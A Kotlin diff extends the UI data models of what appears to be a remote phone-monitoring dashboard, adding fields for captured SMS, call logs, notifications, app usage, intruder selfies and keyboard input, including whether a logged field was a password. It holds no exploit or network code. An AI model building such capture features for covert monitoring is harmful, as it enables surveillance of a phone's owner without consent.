@@ -260,7 +260,8 @@ data class SmsUiItem(
     val isUnread: Boolean,
     val simSlot: String,
     val relativeTime: String,
-    val fullDateTime: String
+    val fullDateTime: String,
+    val timestampMs: Long = 0L
 )
 
 enum class CallFilter(val label: String) {
@@ -280,7 +281,12 @@ data class CallLogUiItem(
     val durationLabel: String,
     val simSlot: String,
     val relativeTime: String,
-    val fullDateTime: String
+    val fullDateTime: String,
+    val timestampMs: Long = 0L,
+    val durationSeconds: Int = 0,
+    val directionLabel: String = "",
+    val location: String? = null,
+    val features: List<String> = emptyList()
 )
 
 enum class NotificationFilter(val label: String) {
@@ -299,7 +305,11 @@ data class NotificationUiItem(
     val body: String,
     val category: NotificationFilter,
     val relativeTime: String,
-    val fullDateTime: String
+    val fullDateTime: String,
+    val timestampMs: Long = 0L,
+    val bigText: String? = null,
+    val subText: String? = null,
+    val messages: List<String> = emptyList()
 )
 
 data class KeyboardUiItem(
@@ -309,7 +319,9 @@ data class KeyboardUiItem(
     val text: String,
     val inputType: String,
     val isPassword: Boolean,
-    val relativeTime: String
+    val relativeTime: String,
+    val packageName: String = "",
+    val timestampMs: Long = 0L
 )
 
 enum class WellbeingRange(val label: String) {
@@ -332,12 +344,14 @@ data class WellbeingAppItem(
     val category: WellbeingCategoryFilter,
     val durationLabel: String,
     val launchCount: Int,
-    val percent: Int
+    val percent: Int,
+    val totalTimeMs: Long = 0L
 )
 
 data class WellbeingBucket(
     val label: String,
-    val normalizedValue: Float
+    val normalizedValue: Float,
+    val durationLabel: String = ""
 )
 
 data class WellbeingUiState(
@@ -349,6 +363,8 @@ data class WellbeingUiState(
     val unlockCount: Int = 0,
     val totalLaunches: Int = 0,
     val activeAppName: String = "None",
+    val syncedLabel: String? = null,
+    val errorMessage: String? = null,
     val buckets: List<WellbeingBucket> = emptyList(),
     val apps: List<WellbeingAppItem> = emptyList()
 )
@@ -356,15 +372,19 @@ data class WellbeingUiState(
 data class AppLockAttemptItem(
     val id: String,
     val timestampLabel: String,
+    val fullDateTime: String = timestampLabel,
     val pinCorrect: Boolean,
     val isLockedOut: Boolean,
     val failedAttempts: Int,
-    val hasSelfiePreview: Boolean
+    val hasSelfiePreview: Boolean,
+    val timestampMs: Long = 0L,
+    val selfieBase64: String? = null
 )
 
 data class AppLockUiState(
     val monitoringState: MonitoringState = MonitoringState.IDLE,
     val isLockEnabled: Boolean = false,
+    val isLockedOut: Boolean = false,
     val searchQuery: String = "",
     val attempts: List<AppLockAttemptItem> = emptyList(),
     val showChangePinDialog: Boolean = false,
@@ -376,10 +396,10 @@ data class VibrateFlashUiState(
     val statusMessage: String = "Hardware Link Ready: Select a pattern to trigger"
 )
 
-enum class WallpaperTarget(val label: String) {
-    HOME("Home Screen"),
-    LOCK("Lock Screen"),
-    BOTH("Both")
+enum class WallpaperTarget(val label: String, val wireValue: String) {
+    HOME("Home Screen", "home"),
+    LOCK("Lock Screen", "lock"),
+    BOTH("Both", "both")
 }
 
 data class WallpaperUiState(
@@ -388,8 +408,46 @@ data class WallpaperUiState(
     val isFetching: Boolean = false,
     val isPushing: Boolean = false,
     val pushProgressPercent: Int = 0,
-    val hasPreviewLoaded: Boolean = false
-)
+    val hasPreviewLoaded: Boolean = false,
+    val homeImageBytes: ByteArray? = null,
+    val lockImageBytes: ByteArray? = null,
+    val isSameWallpaper: Boolean = true
+) {
+    fun activePreviewBytes(): ByteArray? {
+        return when (target) {
+            WallpaperTarget.HOME -> homeImageBytes
+            WallpaperTarget.LOCK -> lockImageBytes ?: if (isSameWallpaper) homeImageBytes else null
+            WallpaperTarget.BOTH -> homeImageBytes ?: lockImageBytes
+        }
+    }
+
+    override fun equals(other: Any?): Boolean {
+        if (this === other) return true
+        if (other !is WallpaperUiState) return false
+        return monitoringState == other.monitoringState &&
+            target == other.target &&
+            isFetching == other.isFetching &&
+            isPushing == other.isPushing &&
+            pushProgressPercent == other.pushProgressPercent &&
+            hasPreviewLoaded == other.hasPreviewLoaded &&
+            homeImageBytes.contentEquals(other.homeImageBytes) &&
+            lockImageBytes.contentEquals(other.lockImageBytes) &&
+            isSameWallpaper == other.isSameWallpaper
+    }
+
+    override fun hashCode(): Int {
+        var result = monitoringState.hashCode()
+        result = 31 * result + target.hashCode()
+        result = 31 * result + isFetching.hashCode()
+        result = 31 * result + isPushing.hashCode()
+        result = 31 * result + pushProgressPercent
+        result = 31 * result + hasPreviewLoaded.hashCode()
+        result = 31 * result + (homeImageBytes?.contentHashCode() ?: 0)
+        result = 31 * result + (lockImageBytes?.contentHashCode() ?: 0)
+        result = 31 * result + isSameWallpaper.hashCode()
+        return result
+    }
+}
 
 data class MonitorPanelsUiState(
     val smsState: MonitoringState = MonitoringState.IDLE,
